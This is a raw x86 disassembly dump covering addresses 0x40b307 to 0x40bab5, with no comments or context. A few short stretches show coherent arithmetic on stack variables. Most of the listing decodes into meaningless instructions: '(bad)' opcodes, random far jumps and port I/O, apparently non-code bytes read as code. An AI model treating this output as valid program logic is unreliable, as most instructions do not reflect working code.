  40b307:	dec    ecx
  40b308:	lods   eax,DWORD PTR ds:[esi]
  40b309:	xor    eax,0x9ef37a86
  40b30e:	bound  eax,QWORD PTR [eax]
  40b310:	adc    BYTE PTR [ebp+0x7b1eaa46],dh
  40b316:	sub    BYTE PTR [esi-0x3b715256],0xd3
  40b31d:	mov    edx,0x4d74252c
  40b322:	pop    edi
  40b323:	sahf   
  40b324:	sub    al,0xff
  40b326:	in     eax,0x5a
  40b328:	cdq    
  40b329:	shl    DWORD PTR [esi+esi*1+0x4d35451d],0xc
  40b331:	inc    BYTE PTR [eax]
  40b333:	(bad)  
  40b335:	mov    BYTE PTR [esi+ebx*2-0x76b7158e],al
  40b33c:	pop    ss
  40b33d:	pop    ebp
  40b33e:	jmp    0x18bcc3bd
  40b343:	pop    edi
  40b344:	fsub   st(2),st
  40b346:	das    
  40b347:	test   al,0x18
  40b349:	loopne 0x40b36b
  40b34b:	xchg   edx,eax
  40b34c:	adc    DWORD PTR [edi],esi
  40b34e:	mov    ecx,0x5f430e5a
  40b353:	jnp    0x40b39a
  40b355:	jp     0x40b31f
  40b357:	or     dl,bl
  40b359:	in     al,0xc9
  40b35b:	sub    al,0x2c
  40b35d:	add    al,0x84
  40b35f:	mov    dl,0x2b
  40b361:	cmp    ebx,edx
  40b363:	ja     0x40b371
  40b369:	mov    edx,DWORD PTR [ebp-0x30]
  40b36c:	jmp    0x40baa7
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	test   edx,0xfa61e2d0
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b39f
  40b3be:	mov    bl,BYTE PTR [ebx+0x36]
  40b3c1:	fistp  DWORD PTR [ebp-0x43a01443]
  40b3c7:	push   0x5
  40b3c9:	sub    eax,0xe815a797
  40b3ce:	and    eax,edx
  40b3d0:	xor    al,0xd5
  40b3d2:	jecxz  0x40b42d
  40b3d4:	jae    0x40b35f
  40b3d6:	mov    dh,dl
  40b3d8:	add    al,0x9c
  40b3da:	dec    edi
  40b3db:	(bad)  
  40b3dc:	retf   0xd258
  40b3df:	push   ebx
  40b3e0:	leave  
  40b3e1:	in     al,0xcc
  40b3e3:	push   edi
  40b3e4:	repz rcr BYTE PTR [edi+0x1a456904],0x5a
  40b3ec:	and    al,BYTE PTR [ebx]
  40b3ee:	stos   DWORD PTR es:[edi],eax
  40b3ef:	ss cwde 
  40b3f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3f2:	icebp  
  40b3f3:	retf   0x84b8
  40b3f6:	ret    
  40b3f7:	push   ss
  40b3f8:	jb     0x40b3ef
  40b3fa:	xchg   BYTE PTR [esi],al
  40b3fc:	push   ebp
  40b3fd:	out    dx,eax
  40b3fe:	enter  0x219,0x43
  40b402:	mov    ecx,0x53249099
  40b407:	xor    edi,DWORD PTR [esi+0x227bc1e]
  40b40d:	mov    ecx,0xc6389ec6
  40b412:	ss adc ebp,ebx
  40b415:	jmp    0x40b3a2
  40b417:	inc    ecx
  40b418:	cmp    BYTE PTR [ebx],dh
  40b41a:	dec    esi
  40b41b:	out    dx,al
  40b41c:	pop    ss
  40b41d:	pop    esp
  40b41e:	adc    al,0xc4
  40b420:	std    
  40b421:	sub    bh,ah
  40b423:	das    
  40b424:	pop    ebp
  40b425:	mov    eax,0xb1b3bfa2
  40b42a:	or     al,0x2d
  40b42c:	mov    esi,0x4d207c2d
  40b431:	scas   al,BYTE PTR es:[edi]
  40b432:	xor    ah,BYTE PTR [esp+ebp*4-0x4b]
  40b436:	sbb    ebx,DWORD PTR [ecx]
  40b438:	dec    eax
  40b439:	inc    edi
  40b43a:	das    
  40b43b:	mov    BYTE PTR [ecx-0x55454fe2],al
  40b441:	cmp    BYTE PTR [edi+0x27],dh
  40b444:	jle    0x40b4a6
  40b446:	repz test al,0xb0
  40b449:	dec    ebp
  40b44a:	mov    ebp,0x3038ebdd
  40b44f:	out    dx,al
  40b450:	jno    0x40b44d
  40b452:	mov    DWORD PTR [edi-0x80],esi
  40b455:	xor    ebp,DWORD PTR [edx-0x3e]
  40b458:	jo     0x40b430
  40b45a:	data16 add al,0x80
  40b45d:	pop    eax
  40b45e:	adc    eax,0x46fbe2dd
  40b463:	xchg   esp,eax
  40b464:	xchg   DWORD PTR ds:0x6558eea6,esi
  40b46a:	scas   al,BYTE PTR es:[edi]
  40b46b:	or     edi,DWORD PTR [edi]
  40b46d:	add    DWORD PTR [edx-0x21301037],eax
  40b473:	in     al,dx
  40b474:	mov    al,ds:0xb4abcc49
  40b479:	test   DWORD PTR [edx-0x4f],esi
  40b47c:	out    dx,eax
  40b47d:	mov    DWORD PTR [ebp-0x619c1cf4],0x1eb7bd9d
  40b487:	pop    ecx
  40b488:	imul   ebp,ebx,0xffffffc7
  40b48b:	sbb    al,BYTE PTR [edx-0xbbef026]
  40b491:	scas   eax,DWORD PTR es:[edi]
  40b492:	sub    edi,DWORD PTR [esi-0x23]
  40b495:	cmp    BYTE PTR [eax],ah
  40b497:	adc    eax,0xfc6540cd
  40b49c:	and    al,BYTE PTR [edi+0x4eda205f]
  40b4a2:	cdq    
  40b4a3:	arpl   WORD PTR [edi-0x2a6c1c85],di
  40b4a9:	popf   
  40b4aa:	dec    ecx
  40b4ab:	(bad)  
  40b4ac:	and    eax,0x66b0a94e
  40b4b1:	fwait
  40b4b2:	rcr    DWORD PTR [esi+0x3e],1
  40b4b5:	mov    BYTE PTR [ebx+0x69],al
  40b4b8:	push   edx
  40b4b9:	cmp    esp,ebp
  40b4bb:	les    esp,FWORD PTR [ecx+edi*2-0x63]
  40b4bf:	jge    0x40b447
  40b4c1:	ror    cl,0x51
  40b4c4:	push   esp
  40b4c5:	std    
  40b4c6:	call   0x51fce370
  40b4cb:	dec    ecx
  40b4cc:	push   eax
  40b4cd:	mov    edi,0x7c06ead9
  40b4d2:	inc    edi
  40b4d3:	dec    esp
  40b4d4:	adc    al,0x8e
  40b4d6:	jle    0x40b4f8
  40b4d8:	pop    edi
  40b4d9:	xor    eax,0xf908e5d2
  40b4de:	jg     0x40b4b1
  40b4e0:	out    0xc7,al
  40b4e2:	mov    bl,0x2f
  40b4e4:	dec    ecx
  40b4e5:	retf   0x6d7f
  40b4e8:	shl    BYTE PTR [edx-0x7c],1
  40b4eb:	push   ds
  40b4ec:	mov    edi,0xe358b004
  40b4f1:	outs   dx,DWORD PTR ds:[esi]
  40b4f2:	adc    al,0x13
  40b4f4:	call   0xf47d:0x65531ddd
  40b4fb:	addr16 retf 
  40b4fd:	xor    BYTE PTR [ebx+0x38],ch
  40b500:	lock and al,0x76
  40b503:	mov    eax,ds:0x8845af1a
  40b508:	pusha  
  40b509:	mov    eax,ds:0x9fdb32b2
  40b50e:	enter  0x60cd,0x43
  40b512:	lahf   
  40b513:	popf   
  40b514:	pop    es
  40b515:	and    BYTE PTR [ebx],dl
  40b517:	dec    esi
  40b518:	jp     0x40b542
  40b51a:	inc    edx
  40b51b:	(bad)
  40b51f:	(bad)  
  40b520:	cmp    DWORD PTR [ecx+0x44],ebp
  40b523:	push   0xffffff90
  40b525:	lea    eax,[ebx-0x45776aa6]
  40b52b:	dec    edi
  40b52c:	aad    0x9b
  40b52e:	pusha  
  40b52f:	je     0x40b4d6
  40b531:	jp     0x40b574
  40b533:	arpl   WORD PTR [ecx],bp
  40b535:	not    BYTE PTR [ecx]
  40b537:	(bad)  
  40b539:	and    al,0x7b
  40b53b:	dec    esp
  40b53c:	or     al,0x7a
  40b53e:	cld    
  40b53f:	dec    ecx
  40b540:	out    0xb1,al
  40b542:	fdivr  st,st(6)
  40b544:	mov    dh,0x40
  40b546:	mov    al,ds:0x5fa1b7ec
  40b54b:	dec    edi
  40b54c:	ins    BYTE PTR es:[edi],dx
  40b54d:	out    dx,eax
  40b54e:	(bad)  
  40b54f:	test   esi,edx
  40b551:	enter  0x6a2a,0xeb
  40b555:	and    ebp,DWORD PTR [eax]
  40b557:	lea    ebx,[esi]
  40b559:	and    eax,0xacb76158
  40b55e:	sub    dl,BYTE PTR [esi-0x4118b3d0]
  40b564:	sub    BYTE PTR [esi+eiz*4],bh
  40b567:	xchg   ebp,eax
  40b568:	jg     0x40b55d
  40b56a:	jmp    0x75ce:0x7339beb1
  40b571:	mov    dh,0x4
  40b573:	scas   al,BYTE PTR es:[edi]
  40b574:	lea    ecx,[edi+edx*2]
  40b577:	mov    ah,0x4e
  40b579:	pop    esi
  40b57a:	jnp    0x40b5ea
  40b57c:	sti    
  40b57d:	dec    ebp
  40b57e:	mov    al,0x97
  40b580:	inc    ebp
  40b581:	hlt    
  40b582:	in     eax,0xf9
  40b584:	outs   dx,BYTE PTR ds:[esi]
  40b585:	shl    BYTE PTR cs:[edi+0x53f0e18d],cl
  40b58c:	and    eax,0x2e
  40b58f:	add    DWORD PTR [eax],ecx
  40b591:	push   0x46be4d63
  40b596:	and    bl,BYTE PTR ds:0xe05e6c99
  40b59c:	mov    dl,0xc3
  40b59e:	mov    ah,BYTE PTR [ebx+0xf911b41]
  40b5a4:	call   0x4711c4ac
  40b5a9:	mov    ah,BYTE PTR [ebx+0x3264ffcf]
  40b5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5b0:	or     BYTE PTR [ecx+0x7c055856],ah
  40b5b6:	call   0xf2b76688
  40b5bb:	add    al,BYTE PTR [ebp+0x54507066]
  40b5c1:	pop    eax
  40b5c2:	lods   eax,DWORD PTR ds:[esi]
  40b5c3:	shl    BYTE PTR [ecx-0xfcfa457],cl
  40b5c9:	cmp    eax,0x55332f7e
  40b5ce:	outs   dx,DWORD PTR ds:[esi]
  40b5cf:	add    ebx,DWORD PTR [esi-0x3efb88fa]
  40b5d5:	stos   DWORD PTR es:[edi],eax
  40b5d6:	lods   al,BYTE PTR fs:[esi]
  40b5d8:	int    0xe1
  40b5da:	mov    esp,0x7d9203d6
  40b5df:	sbb    eax,esi
  40b5e1:	cmp    al,0x59
  40b5e3:	xor    eax,0x3bd3dbb7
  40b5e8:	mov    bh,0x12
  40b5ea:	inc    edx
  40b5eb:	aad    0x51
  40b5ed:	out    0x13,eax
  40b5ef:	add    ch,bh
  40b5f1:	inc    ebp
  40b5f2:	jmp    0xb3f4ce64
  40b5f7:	pop    esi
  40b5f8:	test   al,0xb
  40b5fa:	mov    DWORD PTR [ecx+0x9],ebx
  40b5fd:	cmc    
  40b5fe:	push   edx
  40b5ff:	jo     0x40b5ee
  40b601:	loop   0x40b5e3
  40b603:	sbb    al,0x39
  40b605:	jns    0x40b5b5
  40b607:	push   ecx
  40b608:	mov    ebx,0x8d08f69e
  40b60d:	jmp    0x335f:0x519f3e60
  40b614:	ret    
  40b615:	std    
  40b616:	dec    edx
  40b617:	adc    ecx,DWORD PTR [esi-0x11]
  40b61a:	and    al,0x9c
  40b61c:	and    DWORD PTR [ebx],0xffffffb5
  40b61f:	imul   esp,DWORD PTR [ecx-0x2b],0xfffffffc
  40b623:	loopne 0x40b64b
  40b625:	sbb    eax,0x98de2667
  40b62a:	jg     0x41158b1c
  40b630:	dec    esp
  40b631:	ds das 
  40b633:	ret    0x15ae
  40b636:	lds    ebx,FWORD PTR [eax+0x60]
  40b639:	jmp    0x40b60b
  40b63b:	test   eax,0x2797dea9
  40b640:	ds pop ebx
  40b642:	out    dx,eax
  40b643:	pushf  
  40b644:	cld    
  40b645:	push   cs
  40b646:	fistp  DWORD PTR [ecx-0x34]
  40b649:	inc    ebp
  40b64a:	sbb    edx,eax
  40b64c:	fcom   DWORD PTR [ebx+0x57]
  40b64f:	pop    es
  40b650:	adc    ebx,ebp
  40b652:	adc    BYTE PTR [edx-0x2b82432a],0xdb
  40b659:	and    ah,BYTE PTR [edi+0x76]
  40b65c:	ja     0x40b6a1
  40b65e:	loopne 0x40b612
  40b660:	jbe    0x40b64d
  40b662:	pop    ebx
  40b663:	push   ebp
  40b664:	lods   al,BYTE PTR ds:[esi]
  40b665:	rol    ebp,0x39
  40b668:	lea    esp,[eax-0xd878e86]
  40b66e:	pop    edi
  40b66f:	xor    BYTE PTR [edx],cl
  40b671:	sub    DWORD PTR [edi+0x7d],0xf9d76e94
  40b678:	add    bl,cl
  40b67a:	out    dx,eax
  40b67b:	shr    DWORD PTR ds:0x29d19004,0x57
  40b682:	fs enter 0xeb73,0x20
  40b687:	adc    ch,BYTE PTR [esp+esi*8]
  40b68a:	xor    dh,BYTE PTR [esi+0x5a]
  40b68d:	and    edi,ebx
  40b68f:	inc    ecx
  40b690:	inc    ebx
  40b691:	fisub  DWORD PTR [eax-0x600293e3]
  40b697:	jmp    0xce75f9f1
  40b69c:	pop    esp
  40b69d:	inc    ebp
  40b69e:	lock pusha 
  40b6a0:	retf   0x236
  40b6a3:	and    ecx,esi
  40b6a5:	mov    al,ds:0x4296dedb
  40b6aa:	or     ebp,ecx
  40b6ac:	imul   DWORD PTR [ebx-0x3cbf0575]
  40b6b2:	push   edx
  40b6b3:	and    ebp,ebp
  40b6b5:	pop    ecx
  40b6b6:	into   
  40b6b7:	ja     0x40b6c2
  40b6b9:	sub    ah,BYTE PTR [esi-0xda3d6a8]
  40b6bf:	fild   DWORD PTR [eax+0x76]
  40b6c2:	mov    WORD PTR [esi-0x60],ss
  40b6c5:	sub    BYTE PTR [ebx-0x139f5602],cl
  40b6cb:	xchg   ebp,eax
  40b6cc:	pushf  
  40b6cd:	push   edi
  40b6ce:	mov    WORD PTR [ecx+0x5cb47301],fs
  40b6d4:	sub    eax,DWORD PTR [ebp-0x56d4a595]
  40b6da:	dec    eax
  40b6db:	mov    ebx,DWORD PTR ds:0xa71507ed
  40b6e1:	out    dx,eax
  40b6e2:	call   0x6020:0xc5d10623
  40b6e9:	ret    
  40b6ea:	ret    0x478f
  40b6ed:	mov    ch,0x90
  40b6ef:	inc    edx
  40b6f0:	xor    eax,0x32317e69
  40b6f5:	pop    esi
  40b6f6:	xor    eax,0x51aff078
  40b6fb:	daa    
  40b6fc:	inc    eax
  40b6fd:	pop    ebx
  40b6fe:	add    cl,ah
  40b700:	retf   0xffb0
  40b703:	mov    edi,0xb07b0e57
  40b708:	push   es
  40b709:	sub    ebx,DWORD PTR [edx+0x6d]
  40b70c:	or     BYTE PTR [esi-0x6637d145],dl
  40b712:	mov    ?,WORD PTR [ebx]
  40b714:	shl    BYTE PTR [ebx],1
  40b716:	clc    
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b7c1
  40b743:	mov    dl,0x92
  40b745:	das    
  40b746:	aas    
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b752
  40b74f:	mov    ecx,0x9e38bef6
  40b754:	cli    
  40b755:	out    dx,eax
  40b756:	mov    bl,0xa2
  40b758:	jmp    0x40b759
  40b75a:	shl    BYTE PTR [esi-0x75],1
  40b75d:	xor    al,0x61
  40b75f:	mov    bh,0xb3
  40b761:	pop    es
  40b762:	xchg   edi,esi
  40b764:	mov    BYTE PTR [edi+0x4a],bl
  40b767:	xchg   esp,esp
  40b769:	add    BYTE PTR [ecx+ecx*1],dh
  40b76c:	cli    
  40b76d:	outs   dx,BYTE PTR ds:[esi]
  40b76e:	mov    bl,0x76
  40b770:	sar    DWORD PTR [esi-0x74bce3f1],cl
  40b776:	cmp    bh,BYTE PTR [edi-0x79]
  40b779:	and    ch,BYTE PTR [ecx]
  40b77b:	fwait
  40b77c:	cmp    cl,BYTE PTR [edx+0x7267258]
  40b782:	or     edx,eax
  40b784:	in     eax,0xbd
  40b786:	and    al,BYTE PTR [eax+0x6ede1a5d]
  40b78c:	mov    ?,WORD PTR [edx]
  40b78e:	push   0x9fcafff4
  40b793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b794:	rcr    DWORD PTR cs:[ecx-0x5baeaf48],1
  40b79b:	mov    WORD PTR [esi+0x4],gs
  40b79e:	add    eax,0xbdb59d3f
  40b7a3:	push   esp
  40b7a4:	jl     0x40b7fa
  40b7a6:	jns    0x40b750
  40b7a8:	fidivr DWORD PTR [eax-0x35ebeab8]
  40b7ae:	call   0x591d:0xe6be789a
  40b7b5:	ret    
  40b7b6:	pop    esi
  40b7b7:	inc    ebp
  40b7b8:	jmp    0x5bca:0x959e61d
  40b7bf:	mov    ch,0x7f
  40b7c1:	fld    TBYTE PTR [esi]
  40b7c3:	dec    edi
  40b7c4:	pusha  
  40b7c5:	js     0x40b835
  40b7c7:	ror    BYTE PTR [edi-0x4b],cl
  40b7ca:	pop    edi
  40b7cb:	push   ebp
  40b7cc:	sbb    eax,0xc364b958
  40b7d1:	nop
  40b7d2:	sub    bh,BYTE PTR ds:0xa4dbae2d
  40b7d8:	loopne 0x40b76a
  40b7da:	sbb    ebp,edx
  40b7dc:	in     eax,dx
  40b7dd:	mov    BYTE PTR [ebx-0x76],dh
  40b7e0:	push   ss
  40b7e1:	mov    ebx,0xebe351fb
  40b7e6:	pop    edi
  40b7e7:	mov    edx,0x8546009d
  40b7ec:	xchg   edx,eax
  40b7ed:	hlt    
  40b7ee:	and    DWORD PTR [edx-0x54f03c82],0xe8214358
  40b7f8:	mov    edx,0xacdac0f8
  40b7fd:	out    dx,al
  40b7fe:	retf   
  40b7ff:	fcmovbe st,st(4)
  40b801:	jne    0x40b87f
  40b803:	xchg   edi,eax
  40b804:	into   
  40b805:	mov    WORD PTR [esi+0x192884a],gs
  40b80b:	fnstenv [esp+ebp*1-0x50]
  40b80f:	push   ebp
  40b810:	dec    ebx
  40b811:	dec    ebx
  40b812:	leave  
  40b813:	mov    WORD PTR [ecx+edx*8+0x78b7115],gs
  40b81a:	push   esp
  40b81b:	pop    ebx
  40b81c:	cmp    DWORD PTR ds:0xa8e5110c,edi
  40b822:	mov    ?,WORD PTR ds:0xa467c466
  40b828:	sbb    ebx,DWORD PTR [esi]
  40b82a:	push   ebp
  40b82b:	or     bh,dl
  40b82d:	dec    edi
  40b82e:	adc    bh,BYTE PTR [eax]
  40b830:	retf   
  40b831:	sub    al,0x6e
  40b833:	mov    ebp,0xb4a64a73
  40b838:	fistp  QWORD PTR [edx]
  40b83a:	xchg   BYTE PTR [ebx-0xd4416c3],dh
  40b840:	sub    ecx,DWORD PTR gs:[esi-0x65]
  40b844:	push   ebx
  40b845:	push   esp
  40b846:	in     eax,0xc5
  40b848:	push   edi
  40b849:	addr16 jmp 0x5e0fb059
  40b84f:	xchg   esi,eax
  40b850:	sub    dh,ah
  40b852:	or     bh,BYTE PTR [edx]
  40b854:	loope  0x40b868
  40b856:	sub    BYTE PTR [ebx+eax*2+0x7b],0xc1
  40b85b:	mov    esi,0xe6d7de51
  40b860:	mov    ds:0x20badd94,al
  40b865:	scas   eax,DWORD PTR es:[edi]
  40b866:	xchg   esp,eax
  40b867:	push   es
  40b868:	(bad)  
  40b869:	inc    esp
  40b86a:	sbb    DWORD PTR [ecx-0x7c],esi
  40b86d:	xor    eax,0x9732ad2b
  40b872:	cwde   
  40b873:	sub    al,0xab
  40b875:	lock jge 0x40b87b
  40b878:	fdivr  DWORD PTR [eax]
  40b87a:	push   cs
  40b87b:	scas   eax,DWORD PTR es:[edi]
  40b87c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b87d:	mov    edi,edx
  40b87f:	scas   eax,DWORD PTR es:[edi]
  40b880:	icebp  
  40b881:	aam    0x37
  40b883:	mov    dh,0xff
  40b885:	and    esp,DWORD PTR [ebx-0x6cc09973]
  40b88b:	adc    DWORD PTR [ebx-0x6b1df090],edx
  40b891:	pop    ds
  40b892:	or     BYTE PTR [ebp+0x55],dh
  40b895:	lods   eax,DWORD PTR ds:[esi]
  40b896:	test   al,0x9
  40b898:	mov    edi,0x1f0a1ebe
  40b89d:	xlat   BYTE PTR ds:[ebx]
  40b89e:	pop    esi
  40b89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8a0:	rol    DWORD PTR [ebx+0x0],0x8c
  40b8a4:	mov    ah,0xec
  40b8a6:	push   ebx
  40b8a7:	jbe    0x40b8aa
  40b8a9:	mov    ebx,DWORD PTR [edi-0x59]
  40b8ac:	mov    eax,ds:0x57cbed3f
  40b8b1:	dec    ecx
  40b8b2:	lock mov edx,0x97adb238
  40b8b8:	mov    eax,0xeb5a855b
  40b8bd:	xchg   esp,eax
  40b8be:	adc    al,0x54
  40b8c0:	jle    0x40b852
  40b8c2:	inc    edx
  40b8c3:	jg     0x40b8c5
  40b8c5:	(bad)  
  40b8c6:	jecxz  0x40b85e
  40b8c8:	imul   esi,DWORD PTR [ecx],0xffffffdb
  40b8cb:	push   ss
  40b8cc:	test   BYTE PTR [ebx-0x6f33397d],ah
  40b8d2:	or     BYTE PTR [ecx+ebp*2+0x46],bh
  40b8d6:	scas   eax,DWORD PTR es:[edi]
  40b8d7:	aam    0x89
  40b8d9:	push   cs
  40b8da:	pop    es
  40b8db:	shr    DWORD PTR [eax],1
  40b8dd:	aaa    
  40b8de:	mov    fs,ebx
  40b8e0:	sub    ah,ch
  40b8e2:	cmc    
  40b8e3:	lods   al,BYTE PTR ds:[esi]
  40b8e4:	(bad)  [esi+0x729d8f93]
  40b8ea:	mov    esp,0x83100d59
  40b8ef:	jp     0x40b8d6
  40b8f1:	and    dl,BYTE PTR [edx+0x7c5f3cb7]
  40b8f7:	into   
  40b8f8:	pushf  
  40b8f9:	out    dx,eax
  40b8fa:	pop    ds
  40b8fb:	rcr    BYTE PTR ds:0x98c55d8f,cl
  40b901:	add    edi,DWORD PTR [eax]
  40b903:	add    ah,ch
  40b905:	test   edx,esi
  40b907:	retf   
  40b908:	adc    ebx,esi
  40b90a:	mov    ah,BYTE PTR [ebx]
  40b90c:	cmp    ah,cl
  40b90e:	mov    dl,0xea
  40b910:	dec    ah
  40b912:	stc    
  40b913:	adc    ah,BYTE PTR [esi*8+0x71fa8b21]
  40b91a:	xchg   esi,eax
  40b91b:	pushf  
  40b91c:	ror    BYTE PTR [ebx],cl
  40b91e:	push   esi
  40b91f:	mov    BYTE PTR [esi],bh
  40b921:	or     edx,DWORD PTR [eax+0x59]
  40b924:	adc    eax,0x7ae55f5a
  40b929:	jle    0x40b966
  40b92b:	lds    edi,FWORD PTR [esi]
  40b92d:	xor    DWORD PTR [ebp-0x4c],esp
  40b930:	inc    ebp
  40b931:	rcl    BYTE PTR [eax-0x59],cl
  40b934:	or     eax,0xbce7f6ad
  40b939:	and    BYTE PTR [edx+0xb],dh
  40b93c:	call   0xeef7:0x662cd332
  40b943:	push   ecx
  40b944:	jg     0x40b8ea
  40b946:	or     ebx,DWORD PTR [esi+0x67]
  40b949:	fs ret 
  40b94b:	dec    ebp
  40b94c:	sub    DWORD PTR [ebp+0x70],esp
  40b94f:	dec    eax
  40b950:	(bad)  
  40b951:	outs   dx,DWORD PTR ds:[esi]
  40b952:	jb     0x40b91f
  40b954:	mov    cl,BYTE PTR [edx+0x24]
  40b957:	shl    ebp,0x13
  40b95a:	mov    ecx,0x92a014f6
  40b95f:	mov    ch,0xec
  40b961:	pop    ecx
  40b962:	xor    esi,DWORD PTR [edi+0x6da29c19]
  40b968:	pop    ecx
  40b969:	leave  
  40b96a:	adc    edx,DWORD PTR [edx+0x1c135830]
  40b970:	push   0x5a47e1dc
  40b975:	dec    ebp
  40b976:	xchg   esi,eax
  40b977:	test   DWORD PTR [ebp-0x17],ebx
  40b97a:	push   ebp
  40b97b:	cmp    BYTE PTR [ebx-0x5],al
  40b97e:	cld    
  40b97f:	mov    esi,0x38586283
  40b984:	popf   
  40b985:	and    ebx,DWORD PTR [esi+0x55929aa9]
  40b98b:	cmp    edx,DWORD PTR [edx+0xb]
  40b98e:	ror    BYTE PTR [ebp-0x47],1
  40b991:	shr    esp,1
  40b993:	adc    bl,BYTE PTR [ebx-0x3106f78e]
  40b999:	mov    ch,0xb
  40b99b:	int3   
  40b99c:	aam    0x68
  40b99e:	cmc    
  40b99f:	sub    ch,ch
  40b9a1:	aaa    
  40b9a2:	inc    esi
  40b9a3:	pop    es
  40b9a4:	outs   dx,DWORD PTR ds:[esi]
  40b9a5:	cli    
  40b9a6:	and    ebp,DWORD PTR [ecx+0x70]
  40b9a9:	mov    eax,ds:0xbd370119
  40b9ae:	inc    esi
  40b9af:	or     eax,0x1c2f989b
  40b9b4:	(bad)  
  40b9b5:	push   edx
  40b9b6:	mov    ds:0xa39744bc,eax
  40b9bb:	add    ah,BYTE PTR [ebp+0x284fc800]
  40b9c1:	int    0x76
  40b9c3:	push   edi
  40b9c4:	in     eax,0xdd
  40b9c6:	popf   
  40b9c7:	inc    eax
  40b9c8:	call   0x2dbe:0xd1b3293b
  40b9cf:	lods   al,BYTE PTR ds:[esi]
  40b9d0:	jae    0x40ba3a
  40b9d2:	add    DWORD PTR [esi-0x292ecbf7],0xffffff85
  40b9d9:	mov    esp,0x39b20091
  40b9de:	xchg   edi,eax
  40b9df:	push   edx
  40b9e0:	lods   al,BYTE PTR ds:[esi]
  40b9e1:	ss shl ebx,cl
  40b9e4:	test   BYTE PTR [ebp+edx*4+0x3706dc0f],cl
  40b9eb:	pop    eax
  40b9ec:	push   es
  40b9ed:	dec    edx
  40b9ee:	fs sti 
  40b9f0:	data16 shl BYTE PTR [edx+0x27479ecc],1
  40b9f7:	ja     0x40ba27
  40b9f9:	xor    bl,BYTE PTR [edx-0x59]
  40b9fc:	lock xchg DWORD PTR [esi+0x44],ebp
  40ba00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba01:	sub    ebp,DWORD PTR [ebx+0x53]
  40ba04:	retf   
  40ba05:	jo     0x40b99c
  40ba07:	mov    dh,0x6b
  40ba09:	adc    eax,DWORD PTR ds:0x85d66d7b
  40ba0f:	ror    BYTE PTR [edx],cl
  40ba11:	or     dl,BYTE PTR [eax]
  40ba13:	adc    eax,0x9b624f5f
  40ba18:	add    al,0x61
  40ba1a:	aam    0x2e
  40ba1c:	dec    edi
  40ba1d:	inc    eax
  40ba1e:	(bad)  
  40ba1f:	stos   BYTE PTR es:[edi],al
  40ba20:	psubsb mm6,QWORD PTR [ebx+0x7]
  40ba24:	mov    edi,0xaff1cb9e
  40ba29:	add    DWORD PTR [esi-0x3544c8eb],0x21
  40ba30:	mov    bl,0xd5
  40ba32:	push   esi
  40ba33:	and    dh,BYTE PTR [ebx+0x605a13a5]
  40ba39:	aam    0x1a
  40ba3b:	lock or eax,0x28ca7bf2
  40ba41:	dec    eax
  40ba42:	mov    ch,0x39
  40ba44:	xchg   esp,eax
  40ba45:	push   edi
  40ba46:	xchg   DWORD PTR [esp+ebx*1+0x33],ebx
  40ba4a:	outs   dx,BYTE PTR ds:[esi]
  40ba4b:	(bad)  
  40ba4d:	push   edi
  40ba4e:	pop    es
  40ba4f:	adc    eax,0xeb99c323
  40ba54:	mov    es,WORD PTR [ecx+0x28cf6b4f]
  40ba5a:	adc    DWORD PTR [esi+ebx*8+0x6f0ce374],edi
  40ba61:	jmp    0xaee2:0xca0b127c
  40ba68:	es out dx,eax
  40ba6a:	mov    edx,0x64dc6d56
  40ba6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba70:	xor    BYTE PTR [ebx-0x3df20756],ch
  40ba76:	push   ecx
  40ba77:	inc    esp
  40ba78:	dec    ecx
  40ba79:	dec    esi
  40ba7a:	mov    edx,0x6e84e08
  40ba7f:	pop    ss
  40ba80:	icebp  
  40ba81:	fld    QWORD PTR [eax+0x716aa14c]
  40ba87:	dec    esi
  40ba88:	jecxz  0x40ba1f
  40ba8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba8b:	mov    dl,0x2a
  40ba8d:	pop    ss
  40ba8e:	mov    esp,0xa854de4c
  40ba93:	add    DWORD PTR [ebx+0x5df7b04a],ecx
  40ba99:	add    al,0xf3
  40ba9b:	pop    ds
  40ba9c:	fst    QWORD PTR ds:0xcbcf45a7
  40baa2:	dec    ecx
  40baa3:	les    ecx,FWORD PTR [ebx+0x7d8bc455]
  40baa9:	cld    
  40baaa:	xor    edi,eax
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
